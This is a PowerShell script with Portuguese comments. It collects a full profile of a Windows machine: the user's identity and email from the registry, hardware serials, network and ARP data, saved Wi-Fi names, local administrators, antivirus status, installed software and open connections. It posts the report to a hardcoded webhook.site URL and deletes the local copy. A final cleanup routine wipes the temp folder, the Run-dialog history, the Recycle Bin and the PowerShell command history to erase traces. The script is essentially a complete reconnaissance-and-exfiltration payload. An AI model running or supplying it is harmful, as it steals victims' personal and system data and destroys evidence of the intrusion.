<#
    exporta-wifi-const.ps1

    Versão modificada:
      - Não usa parâmetros
      - A URL do webhook é definida como constante (variável no topo) e deve ser editada antes do uso
      - Ao executar o script ele gera o arquivo e envia para o webhook (se $WebhookUrl estiver preenchida)

    ATENÇÃO: use apenas em máquinas ou ambientes com autorização.
#>

# === CONFIGURAÇÕES (edite aqui antes de executar) ===

# Deixe vazio ('') se não quiser enviar automaticamente para webhook
$WebhookUrl = 'https://webhook.site/0e19741a-559b-4878-9931-512f553f8733'


$ExportDirDefault = Join-Path $env:TEMP 'p'
$OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'

function Get-SystemInfo {
    [CmdletBinding()]
    param(
        [string]$OutputFile = $OutputFileDefault,
        [string]$ExportDir = $ExportDirDefault
    )

    $ErrorActionPreference = 'SilentlyContinue'
    $sb = [Text.StringBuilder]::new()
    $sep = '=' * 70
    $add = { param($x) [void]$sb.AppendLine([string]$x) }
    $sec = { param($x) & $add ''; & $add $x; & $add ('-' * 70) }
    $try = {
        param([scriptblock]$b)
        try { & $b } catch { $null }
    }

    & $add $sep
    & $add 'RELATÓRIO COMPLETO DO SISTEMA'
    & $add "Coletado em: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    & $add $sep

    & $sec '## 1. IDENTIFICAÇÃO DO USUÁRIO'
    @(
        "Usuário Logado       : $env:USERNAME"
        "Domínio              : $env:USERDOMAIN"
        "Domínio DNS          : $env:USERDNSDOMAIN"
        "Nome Completo (env)  : $env:FULLNAME"
        "Perfil Path          : $env:USERPROFILE"
        "Computador           : $env:COMPUTERNAME"
    ) | % { & $add $_ }

    $email = '[não disponível]'
    foreach($q in @(
        { (gp 'HKCU:\Software\Microsoft\Office\*\Outlook\Profiles\*' -Name 'Account Name').'Account Name' | select -First 1 }
        { (gp 'HKCU:\Software\Microsoft\Office\*\Outlook\v3\Client.Data').'User Information.Email' }
        { (gp 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles*').'Email' }
        { (gp 'HKCU:\Software\Microsoft\IdentityCRL').'StoredUserName' }
        { gci 'HKCU:\Software\Microsoft\IdentityStore\Accounts' | % { gp $_.PSPath } | ? DisplayableId -match '@' | select -First 1 -Expand DisplayableId }
    )) {
        $v = & $try $q
        if($v){ $email = $v; break }
    }
    & $add "Email                : $email"

    & $sec '## 2. SISTEMA OPERACIONAL'
    $os = & $try { gi Win32_OperatingSystem }
    if($os){
        @(
            "Sistema Operacional  : $($os.Caption)"
            "Versão               : $($os.Version)"
            "Build                : $($os.BuildNumber)"
            "SKU                  : $($os.OperatingSystemSKU)"
            "Arquitetura          : $($os.OSArchitecture)"
            "Idioma               : $($os.MUILanguages -join ', ')"
            "Data Instalação      : $($os.InstallDate)"
            "Último Boot          : $($os.LastBootUpTime)"
            "Tempo Ativo (dias)   : $([math]::Round(((Get-Date)-$os.LastBootUpTime).TotalDays,1))"
            "Tipo de Produto      : $($os.ProductType)"
            "Registered User      : $($os.RegisteredUser)"
            "Windows Directory    : $($os.WindowsDirectory)"
        ) | % { & $add $_ }
    }

    $cs = & $try { gi Win32_ComputerSystem }
    if($cs){
        @(
            "Fabricante           : $($cs.Manufacturer)"
            "Modelo               : $($cs.Model)"
            "SMBIOS               : $($cs.SMBIOSBIOSVersion)"
            "Sistema Tipo         : $($cs.SystemType)"
            "Memória Física       : $([math]::Round($cs.TotalPhysicalMemory/1GB,2)) GB"
        ) | % { & $add $_ }
    }

    $bios = & $try { gi Win32_BIOS }
    if($bios){
        @(
            "BIOS/UEFI            : $($bios.Name) v$($bios.SMBIOSBIOSVersion)"
            "BIOS Fabricante      : $($bios.Manufacturer)"
            "BIOS Release Date    : $($bios.ReleaseDate)"
        ) | % { & $add $_ }
    }

    & $sec '## 3. HARDWARE'
    $cpu = & $try { gi Win32_Processor | select -First 1 }
    if($cpu){
        @(
            "CPU                  : $($cpu.Name)"
            "Cores                : $($cpu.NumberOfCores)"
            "Threads              : $($cpu.NumberOfLogicalProcessors)"
            "Clock Base           : $($cpu.MaxClockSpeed) MHz"
            "Clock Atual          : $($cpu.CurrentClockSpeed) MHz"
            "Cache L2             : $([math]::Round($cpu.L2CacheSize/1KB,0)) KB"
            "Cache L3             : $([math]::Round($cpu.L3CacheSize/1KB,0)) KB"
        ) | % { & $add $_ }
    }

    $ram = & $try { gi Win32_PhysicalMemory }
    if($ram){
        & $add ''; & $add 'MEMÓRIA RAM:'
        $ram | % { & $add "  - $([math]::Round($_.Capacity/1GB,1)) GB | $($_.Speed) MHz | $($_.Manufacturer) | $($_.PartNumber)" }
    }

    $disks = & $try { gi Win32_DiskDrive }
    if($disks){
        & $add ''; & $add 'DISCOS:'
        $disks | % { & $add "  - $($_.Model) | $([math]::Round($_.Size/1GB,0)) GB | $($_.InterfaceType) | Serial: $($_.SerialNumber)" }
    }

    $parts = & $try { gi Win32_LogicalDisk -Filter 'DriveType=3' }
    if($parts){
        & $add ''; & $add 'PARTIÇÕES:'
        $parts | % {
            $used = $_.Size - $_.FreeSpace
            & $add "  - $($_.DeviceID) | FS: $($_.FileSystem) | Total: $([math]::Round($_.Size/1GB,2)) GB | Usado: $([math]::Round($used/1GB,2)) GB | Livre: $([math]::Round($_.FreeSpace/$_.Size*100,1))%"
        }
    }

    $gpus = & $try { gi Win32_VideoController }
    if($gpus){
        & $add ''; & $add 'GPU:'
        $gpus | % {
            & $add "  - $($_.Name)"
            & $add "    Driver: $($_.DriverVersion) | Data: $($_.DriverDate) | VRAM: $([math]::Round($_.AdapterRAM/1GB,1)) GB | Res: $($_.CurrentHorizontalResolution)x$($_.CurrentVerticalResolution)"
        }
    }

    $mb = & $try { gi Win32_BaseBoard | select -First 1 }
    if($mb){
        & $add ''; & $add 'PLACA-MÃE:'
        @("  Fabricante: $($mb.Manufacturer)","  Modelo: $($mb.Product)","  Serial: $($mb.SerialNumber)") | % { & $add $_ }
    }

    $usb = & $try { gi Win32_USBControllerDevice | % {
        [regex]::Match($_.Dependent,'Name="([^"]+)"').Groups[1].Value
    } | ? { $_ } | select -Unique -First 20 }
    if($usb){ & $add ''; & $add 'USB:'; $usb | % { & $add "  - $_" } }

    $bat = & $try { gi Win32_Battery }
    if($bat){
        & $add ''; & $add 'BATERIA:'
        $bat | % { & $add "  - $($_.Name) | Status: $($_.BatteryStatus) | Design: $([math]::Round($_.DesignCapacity/1000,0)) mWh | Atual: $([math]::Round($_.CurrentCapacity/1000,0)) mWh" }
    }

    & $sec '## 4. REDE'
    $globalIp = '[não disponível]'
    foreach($u in 'https://api.ipify.org','https://ifconfig.me','https://icanhazip.com'){
        if($globalIp -eq '[não disponível]'){
            $v = & $try { (iwr $u -UseBasicParsing -TimeoutSec 5).Content.Trim() }
            if($v){ $globalIp = $v }
        }
    }
    & $add "IP Global            : $globalIp"

    $route = & $try { Get-NetRoute -DestinationPrefix '0.0.0.0/0' -AddressFamily IPv4 | sort RouteMetric | select -First 1 }
    if($route){
        $cfg = & $try { Get-NetIPConfiguration -InterfaceIndex $route.InterfaceIndex }
        if($cfg){ @(
            "MAC                  : $($cfg.MacAddress)"
            "Adapter              : $($cfg.InterfaceDescription)"
            "Alias                : $($cfg.InterfaceAlias)"
        ) | % { & $add $_ } }
    }

    $conn = '[não disponível]'
    $wifi = & $try { Get-NetAdapter | ? InterfaceDescription -match 'Wireless|Wi-Fi|WLAN' }
    if($wifi){
        $w = & $try { netsh wlan show interfaces 2>$null | sls '^\s*State\s*:\s*(.+)' }
        $conn = if($w -match 'connected'){ 'Wi-Fi (Conectado)' } else { 'Wi-Fi' }
    } elseif(& $try { Get-NetAdapter | ? { $_.InterfaceDescription -match 'Ethernet|LAN|Gigabit' -and $_.Status -eq 'Up' } }){
        $conn = 'Cabo Ethernet (Conectado)'
    }
    & $add "Tipo de Conexão      : $conn"

    $ips = & $try { Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } }
    if($ips){
        & $add ''; & $add 'ENDEREÇOS IP:'
        $ips | % {
            $c = & $try { Get-NetIPConfiguration -InterfaceIndex $_.InterfaceIndex }
            & $add "  - $($_.IPAddress) | Adapter: $($c.InterfaceAlias) | Prefix: $($_.PrefixLength) | DHCP: $($c.Dhcpv4Enabled)"
        }
    }

    $gws = & $try { Get-NetIPConfiguration | ? IPv4DefaultGateway }
    if($gws){
        & $add ''; & $add 'GATEWAYS/DNS:'
        $gws | % {
            $dns = if($_.DnsServer){ $_.DnsServer -join ', ' }else{'[nenhum]'}
            & $add "  - $($_.InterfaceAlias) | Gateway: $($_.IPv4DefaultGateway.NextHop) | DNS: $dns"
        }
    }

    $arp = & $try { Get-NetNeighbor | ? State -ne 'Unreachable' | select -First 30 }
    if($arp){
        & $add ''; & $add 'ARP:'
        $arp | % { & $add "  - $($_.IPAddress) | MAC: $($_.MacAddress) | $($_.State) | $($_.InterfaceAlias)" }
    }

    $profiles = & $try { netsh wlan show profiles 2>$null | sls '^\s*All User Profile\s*:\s*(.+)' | % { $_.Matches[0].Groups[1].Value.Trim() } }
    if($profiles){
        & $add ''; & $add 'REDES WIFI SALVAS (somente SSID):'
        $profiles | % { & $add "  - $_" }
    }

    $dhcp = & $try { Get-NetIPConfiguration | ? IPv4DHCPEnabled }
    if($dhcp){
        & $add ''; & $add 'DHCP:'
        $dhcp | % { & $add "  - $($_.InterfaceAlias) | DHCP: Habilitado | DNS Suffix: $($_.DnsSuffix)" }
    }

    & $sec '## 5. SEGURANÇA'
    $fw = & $try { Get-NetFirewallProfile }
    if($fw){
        $f = $fw | % { "$($_.Name): $(if($_.Enabled){'ATIVADO'}else{'DESATIVADO'})" }
        & $add "Windows Firewall     : $($f -join ', ')"
    }

    $av = & $try { Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntivirusProduct }
    if($av){
        & $add ''; & $add 'ANTIVÍRUS:'
        $av | % { & $add "  - $($_.DisplayName) | Status: $($_.productState)" }
    }

    $upd = & $try {
        $s = New-Object -ComObject Microsoft.Update.Session
        $q = $s.CreateUpdateSearcher()
        [pscustomobject]@{ Last=$q.LastSearchSuccessDate; Pending=$q.Search('IsInstalled=0').Updates }
    }
    if($upd){
        & $add ''; & $add 'WINDOWS UPDATE:'
        & $add "  Última busca: $($upd.Last)"
        & $add "  Pendentes: $($upd.Pending.Count)"
        $upd.Pending | select -First 10 | % { & $add "    - $($_.Title)" }
    }

    $users = & $try { Get-LocalUser }
    if($users){
        & $add ''; & $add 'USUÁRIOS LOCAIS:'
        $users | % { & $add "  - $($_.Name) | Ativo: $($_.Enabled) | Último Login: $($_.LastLogon) | Senha alterada: $($_.PasswordLastSet)" }
    }

    $admins = & $try { Get-LocalGroupMember -Group Administrators }
    if($admins){
        & $add ''; & $add 'ADMINISTRADORES:'
        $admins | % { & $add "  - $($_.Name) ($($_.ObjectType))" }
    }

    $shares = & $try { Get-SmbShare }
    if($shares){
        & $add ''; & $add 'COMPARTILHAMENTOS SMB:'
        $shares | % { & $add "  - $($_.Name) | $($_.Path) | $($_.ShareType)" }
    }

    $mapped = & $try { Get-PSDrive -PSProvider FileSystem | ? DisplayRoot }
    if($mapped){
        & $add ''; & $add 'DRIVES MAPEADOS:'
        $mapped | % { & $add "  - $($_.Name): -> $($_.DisplayRoot)" }
    }

    $services = & $try { Get-Service | ? { $_.Status -eq 'Running' -and $_.StartType -eq 'Automatic' } }
    if($services){
        & $add ''; & $add 'SERVIÇOS AUTOMÁTICOS EM EXECUÇÃO:'
        $services | select -First 30 | % { & $add "  - $($_.Name) | $($_.DisplayName)" }
    }

    $proc = & $try { Get-Process | sort WorkingSet64 -Desc | select -First 20 }
    if($proc){
        & $add ''; & $add 'TOP 20 PROCESSOS POR MEMÓRIA:'
        $proc | % { & $add "  - $($_.ProcessName) | PID: $($_.Id) | Mem: $([math]::Round($_.WorkingSet64/1MB,1)) MB" }
    }

    $apps = & $try {
        gp 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' |
        ? DisplayName | select DisplayName,DisplayVersion,Publisher | sort DisplayName
    }
    if($apps){
        & $add ''; & $add 'PROGRAMAS INSTALADOS:'
        $apps | select -First 50 | % { & $add "  - $($_.DisplayName) v$($_.DisplayVersion) | $($_.Publisher)" }
    }

    $tasks = & $try { Get-ScheduledTask | ? { $_.State -eq 'Ready' -and $_.TaskPath -notlike '\Microsoft\*' } | select -First 20 }
    if($tasks){
        & $add ''; & $add 'TAREFAS AGENDADAS (TERCEIROS):'
        $tasks | % { & $add "  - $($_.TaskPath)$($_.TaskName) | $($_.State)" }
    }

    $routes = & $try { Get-NetRoute -AddressFamily IPv4 | ? { $_.NextHop -notin '0.0.0.0','255.255.255.255' } | select -First 20 }
    if($routes){
        & $add ''; & $add 'ROTAS:'
        $routes | % { & $add "  - $($_.DestinationPrefix) | Gateway: $($_.NextHop) | Métrica: $($_.RouteMetric)" }
    }

    $listen = & $try { netstat -ano 2>$null | sls LISTENING | select -First 30 }
    if($listen){
        & $add ''; & $add 'PORTAS EM ESCUTA:'
        $listen | % { & $add "  - $($_.Line.Trim())" }
    }

    $est = & $try { netstat -ano 2>$null | sls ESTABLISHED | select -First 30 }
    if($est){
        & $add ''; & $add 'CONEXÕES ESTABELECIDAS:'
        $est | % { & $add "  - $($_.Line.Trim())" }
    }

    & $sec '## 6. VARIÁVEIS DE AMBIENTE'
    foreach($n in 'PATH','APPDATA','PROGRAMDATA','SYSTEMDRIVE','SYSTEMROOT','TEMP','TMP','USERDOMAIN','USERNAME','COMPUTERNAME'){
        $v = [Environment]::GetEnvironmentVariable($n)
        if($v){
            $v = if($v.Length -gt 40){$v.Substring(0,20)+'...'+$v.Substring($v.Length-15)}else{$v}
            & $add "  $n = $v"
        }
    }

    & $add ''; & $add $sep; & $add 'FIM DO RELATÓRIO'; & $add $sep

    try{
        if(!(Test-Path $ExportDir -PathType Container)){ New-Item $ExportDir -ItemType Directory -Force | Out-Null }
        $sb.ToString() | Out-File $OutputFile -Encoding UTF8 -Force
        Write-Host "Relatório salvo em: $OutputFile"
        $OutputFile
    }catch{
        Write-Error "Falha ao salvar relatório em $OutputFile`: $_"
    }
}

##############################################################################

function send_file_to_webhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%

        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,                   # URL do webhook para onde enviar

        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo

        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
    )

    # Resolve o caminho do arquivo
    $resolvedPath = $null
    if ([System.IO.Path]::IsPathRooted($FilePath)) {
        if (Test-Path -Path $FilePath -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $FilePath).ProviderPath
        } else {
            throw "Arquivo informado não existe: $FilePath"
        }
    } else {
        $candidate1 = Join-Path $env:TEMP $FilePath
        $candidate2 = Join-Path $ExportDir $FilePath

        if (Test-Path -Path $candidate1 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
        } else {
            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
        }
    }

    # Envia e apaga o arquivo após envio
    try {
        # Lê o conteúdo do arquivo
        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8

        # Monta a string no formato "Titulo: conteudo"
        $payloadText = "${Titulo}: ${fileContent}"

        # Converte a string montada para bytes UTF-8
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)

        # Envia a requisição
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'

        # Remove o arquivo após envio
        if (Test-Path -Path $resolvedPath) {
            Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
    } finally {
        # Remove exportdir apenas se solicitado explicitamente
        try {
            if ($RemoveExportDir.IsPresent) {
                if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
                    Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-Verbose "Falha ao remover pasta de exportação: $_"
        }
    }

    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
}


######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
function Invoke-DataDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [scriptblock]$DumpCommand,

        [Parameter(Mandatory = $true)]
        [string]$OutputFile,

        [Parameter(Mandatory = $false)]
        [string]$ExportDir
    )

    try {
        # Executa o comando passado via ScriptBlock
        $out = &$DumpCommand

        # Se o comando não retornar o caminho em texto, usa o OutputFile
        if ([string]::IsNullOrWhiteSpace($out)) {
            $out =$OutputFile
        }

        Write-Host "Arquivo gerado em: $out"
        return $out
    } catch {
        Write-Error "Erro ao gerar arquivo: $_"
        exit 1
    }
}


####### Enviar ao Webhook ######
function Send-DumpToWebhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $false)]
        [string]$WebhookUrl,

        [Parameter(Mandatory = $false)]
        [string]$Title = "Relatório de Dump",

        [Parameter(Mandatory = $false)]
        [string]$ExportDir,

        [Parameter(Mandatory = $false)]
        [switch]$RemoveExportDir
    )

    # Executa apenas se a URL do Webhook for informada
    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
        try {
            Write-Host "Enviando para webhook: $WebhookUrl"

            # Monta os parâmetros dinamicamente (Splatting)
            $splatParams = @{
                FilePath   = $FilePath
                WebhookUrl = $WebhookUrl
                Titulo     = $Title
            }

            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }

            # Executa a função interna de envio
            $sendResult = send_file_to_webhook @splatParams

            # Exibe o resultado checando o retorno do objeto
            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }

                Write-Host "Envio concluído: $fileSent em$timeSent"
            } else {
                Write-Host "Envio concluído com sucesso."
            }
        } catch {
            Write-Error "Erro durante envio para webhook: $_"
        }
    }
}

  

##### Funcao de Limpeza ####
function Clear-All {
    $ea = 'SilentlyContinue'
    rm "$env:TEMP\*" -r -fo -ea $ea
    rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
    Clear-RecycleBin -fo -ea $ea
    rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
    echo "Limpeza concluída!"
}

#### Executa ####
$out = Invoke-DataDump `
    -DumpCommand { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } `
    -OutputFile $OutputFileDefault `
    -ExportDir $ExportDirDefault

Send-DumpToWebhook `
    -FilePath $out `
    -WebhookUrl $WebhookUrl `
    -Title "System Info" `
    -ExportDir $ExportDirDefault `
    -RemoveExportDir

Clear-All